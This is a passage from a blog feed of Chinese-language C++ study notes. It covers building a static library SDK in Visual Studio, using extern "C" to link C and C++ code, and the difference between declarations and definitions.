mysdk&#123;</span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">getVersion</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; SDK_VERSION &lt;&lt; std::endl;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *ver = SDK_VERSION;</span><br><span class="line"><span class="keyword">return</span> ver;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; mysdk::<span class="built_in">getVersion</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/11/sdk/000.png" class=""><p>说明命名空间没问题。<br>想要别的功能添加到<code>namespace mysdk</code>下面就行，调用的时候也跟std方式相同。</p><p>先当已经封装好功能了<br>然后右击右边的文件夹打开属性或者直接在顶栏找项目里的属性，打开之后</p><img src="/2022/06/11/sdk/001.png" class=""><p>修改一下，让生成的是.lib文件，不是.exe。</p><p>还需要一个头文件当声明的地方：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysdk.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mysdk&#123;</span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *<span class="title">getVersion</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成后右击项目点击生成。失败了就先清理一下在点生成。<br>成功之后就是打开项目所在的文件夹，找debug里面，会看到.lib之类的文件</p><img src="/2022/06/11/sdk/002.png" class=""><p>给别人使用的话除了我们生成的.lib库文件，还要把.h头文件一并给他，毕竟声明在里面。</p><p>不过真正意义上的sdk还是需要将这些做成一个安装包下发，指定安装到计算机文件某一处，这样比自己拖来拖去方便的多。</p><p>这里就先随便了，新建文件夹，把.h和.lib文件放入其中</p><img src="/2022/06/11/sdk/003.png" class=""><p>然后顺手新建一个项目，老样子打开项目属性，将制作好的.h和.lib路径添加进去：</p><img src="/2022/06/11/sdk/004.png" class=""><p>这样之后引入头文件是没啥问题了，但是使用的时候还是有问题，因为没有运行库</p><img src="/2022/06/11/sdk/005.png" class=""><h2 id="1-预编译命令"><a href="#1-预编译命令" class="headerlink" title="1. 预编译命令"></a>1. 预编译命令</h2><p>这样之后是添加了库文件，但是编译器一般不会主动调用这个库，所以需要手动添加<br><code>#pragma comment(lib,&quot;sdk.lib&quot;)</code></p><p>然后润的时候发现了问题</p><img src="/2022/06/11/sdk/006.png" class=""><p>简单来说就是main函数重复了，回头一想才发现编译lib的时候main还在，那就给他注释一下。重新编译之后拖到那个文件夹，然后就跑起来了。</p><img src="/2022/06/11/sdk/007.png" class=""><h2 id="2-添加预编译库"><a href="#2-添加预编译库" class="headerlink" title="2. 添加预编译库"></a>2. 添加预编译库</h2><p>当然添加预编译指令嫌麻烦的话，也可以在项目链接器了添加.lib就完事</p><img src="/2022/06/11/sdk/008.png" class=""><hr><img src="/2022/06/11/sdk/009.png" class=""><p>函数调用自然也不在话下。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>基础操作。。随便记记先</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>extern</title>
      <link href="/2022/06/11/extern/"/>
      <url>/2022/06/11/extern/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>C语言和c++对于函数在编译后的处理不同，所以也要注意源文件不要混用</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>项目里新建俩文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hh.cpp</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译的时候就发现报错了：<img src="/2022/06/11/extern/000.png" class=""></p><p>然后新建两个C语言源文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译前先注释掉main.cpp的main函数，因为一个程序只能有一个main函数。<br>然后就是注释掉hh.cpp的ave函数。</p><img src="/2022/06/11/extern/001.png" class=""><p>能够看到，函数编译后的结果在.obj文件中时，c++和C语言的函数名都不一样。</p><p>显然c++的函数名编译后还是很详细，有类型 函数名 参数 主体之类的，而C语言就加了个下划线<br>还记得函数重载的话，就会想到这个问题，因为C语言没有函数重载，所以他的函数除了冲突就没用别的要判断，而c++反而因为有了重载，比较起来会更加繁琐。</p><blockquote><p>而你.c和.cpp混用的时候，两个函数在.obj里面的表现不一样，所以编译通过了。</p></blockquote><p>当头文件有声明，.c文件有定义，.cpp调用，同样的也会报错，函数是以C语言的模式编译，cpp就整不明白这个函数了。</p><p>所以也要用到extern做声明，extern声明变量应该是在上一章写过了，声明函数的格式：<br><code>extern &quot;C&quot; int Ave(int a,int b);</code><br>或者<br><code>extern &quot;C&quot;&#123;&#125;</code> 这样主要是有多个函数需要声明的时候可以用花括号套起来。</p><p><strong>但是声明归声明，别忘了C语言没有重载，不要做二愣子操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//emc.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//emc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;cma.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就不需要瞎搞成cpp的函数方式了，直接用c的方法去读就行了。</p><p>extren除了套函数声明，还可以直接套头文件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span>&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">include</span><span class="string">&quot;cma.h&quot;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">Ave</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样操作后，emc.h里面就不需要用extern指定了。</p><hr><p>当头文件被.c和.cpp同时调用，函数会被编译成啥鸟样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;cma.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">Ave</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//emc.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//emc.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;cma.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/11/extern/002.png" class=""><p>看到是由<code>extern &quot;C&quot;</code>发出的错误。<br>大概就明白<code>extern &quot;C&quot;</code>这种写法属于c++的，C语言没有这种操作，所以才会报错。</p><p>如果真的需要让两个不同的源文件调用，可以用<code>#ifdef</code> 去判断<br>在c++中有个隐藏的宏定义，<code>__cplusplus</code>，这样也省得我们去设置宏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//emc.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但更合理的做法感觉是只选<code>extern &quot;C&quot;</code>那块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure><p>因为函数声明都在头文件的前提，只有当源文件类型不同时，才会显示特别的声明。<br>如果都放在<code>#ifdef</code>里面，那么C语言文件如果有对函数的定义就会变成既声明又定义了，因为这块内容编译后展开对于C语言源文件不存在。</p><p>声明较多的时候感觉这样写也问题不大：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><blockquote><p>记住C语言没有重载，用extern去用c风格的时候不要带入重载的。</p></blockquote><hr><h2 id="LNK4042"><a href="#LNK4042" class="headerlink" title="LNK4042"></a>LNK4042</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hh.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ave</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hh.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hh.cpp</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">ave</span>(<span class="number">2</span>,<span class="number">5</span>) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">add</span>(<span class="number">2</span>,<span class="number">5</span>) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义分别在两个源文件中。调用在main.cpp。</p><blockquote><p>这里源文件能重名是因为类型不一样，这种写法不理智，这就举个例子。</p></blockquote><p>所以当编译的时候会将源文件编译成.obj 最后给链接成.exe<br>当出现重名的源文件时，两个重名的.obj链接就多余了。也就导致了报错。</p><p>这个问题其实正常人应该没这无聊去混用这两个。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><strong>还是辣句话c++可以这样兼容c语言，但是反过来不行</strong></p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>translater-定义/声明/文件</title>
      <link href="/2022/06/09/translater/"/>
      <url>/2022/06/09/translater/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>声明</li><li>定义</li></ul><blockquote><p>#pragma once是一个比较常用的C&#x2F;C++预处理指令，只要在头文件的最开始加入这条预处理指令，就能够保证头文件只被编译一次。<br>#pragma once是编译器相关的，有的编译器支持，有的编译器不支持，具体情况请查看编译器API文档，不过大部分编译器都有这个预处理指令了。<br>#ifndef，#define，#endif是C&#x2F;C++语言中的宏定义，通过宏定义避免文件多次编译。所以在所有支持C++语言的编译器上都是有效的，如果写的程序要跨平台，最好使用这种方式。<br>#ifdef 和 #define 显然 if 有define这个宏，才会执行里面的内容</p></blockquote><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><strong>一般情况下：声明就是告诉编译器存在这么一个东西，就有点像函数；而定义则是申请了内存，就像用到了变量。</strong><br>但是并不是绝对的，概念性的东西还是看人为理解。</p><hr><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在学c的时候就知道编译的时候是逐条执行，程序运行先从主函数开始，所以当自定义函数写于主函数之后时你去调用，编译器找不到这个函数的声明，他不知道这个函数在哪，函数有几个形参，函数里面要进行什么操作，函数要返回什么值。<br>解决方法就是要么将自定义函数全写在主函数之上，或者在主函数前或里面声明。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//int add(int a,int b);</span></span><br><span class="line"><span class="type">int</span> x = <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说<code>int add(int a,int b); </code>这一句就是函数的声明，那么定义自然就是{}里面的内容</p><blockquote><p>ps：声明的时候可以不写函数形参的变量名~ 反正这个变量名只有在实现的时候才用到。<br>所以int add(int a,int b); 在声明的时候可以写成int add(int,int);<br>甚至说声明的时候变量名和定义的时候不一样也没啥太大关系</p></blockquote><p>除了主函数调用其他函数的时候要声明，函数之间的互相调用如果不是正常顺序也要提前声明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">abc</span><span class="params">()</span></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;hhhhhabc&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">cba</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cba</span><span class="params">()</span></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;cbahhhhh&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样肯定会报错，因为abc在cba之前声明和定义了，解决方法也跟主函数那会说的一样。</p><hr><h2 id="变量-extern"><a href="#变量-extern" class="headerlink" title="变量-extern"></a>变量-extern</h2><p>我们常说定义一个变量而非声明一个变量<br>是因为定义变量的时候一般都进行初始化或者赋值操作了，他不是一个模板一样的存在，而是已经实际开辟了空间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="comment">//int a; 也不算声明</span></span><br></pre></td></tr></table></figure><p>写在哪里不重要，对于变量而言默认就是定义。<strong>拿初值这个东西来判断变量是声明还是定义是不靠谱的，因为变量即使不初始化也会有值，只不过是随机产生的垃圾值罢了</strong><br>当然作为变量想要去做声明，需要用到extern关键词。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> a;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>但其实extern的本意是在全局的情况下做声明，目的自然是为了让其他函数或者其他文件能发现这个变量。<br>所以extern没必要放在函数里去用，而函数声明的时候其实自带了extern，不需要手动设定了，也就说函数自带全局特性。</p><hr><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>已知的有栈区和堆区<br>那么全局变量也有对应占用的地方<br>源代码也会有占用的地方</p><p>网上的图可能比较高级和详细：</p><img src="/2022/06/09/translater/000.jpg" class=""><p>之所以会划分，是因为总不能运行一个程序就把所有内存都给他，那这样一下子就爆内存了。。<br>显然是挨个映射到各个区，不用就销毁来得自然。</p><p>x86的内存那会最高是4g，实际上倒是达不到，然后内核吃了一大部分，剩下的是给用户的。</p><p>内存简图没找到合适的，看什么时候有个合适的好理解。</p><hr><h2 id="头文件和源文件"><a href="#头文件和源文件" class="headerlink" title="头文件和源文件"></a>头文件和源文件</h2><p>在C语言中：<code>.h</code>的是头文件，<code>.c</code>就是源文件<br>而c++其实引用的标准头文件已经不怎么看到<code>.h</code>了，事实上也没差；源文件也就是<code>.cpp</code>的文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello world!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种语言引用的标准头文件不同，输入输出自然也不相同，但是c++是C语言的超集，他可以套用c语言的内容，但是反过来C语言不能套用c++；</p><p>简单玩一下分文件写法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//function.cpp</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span 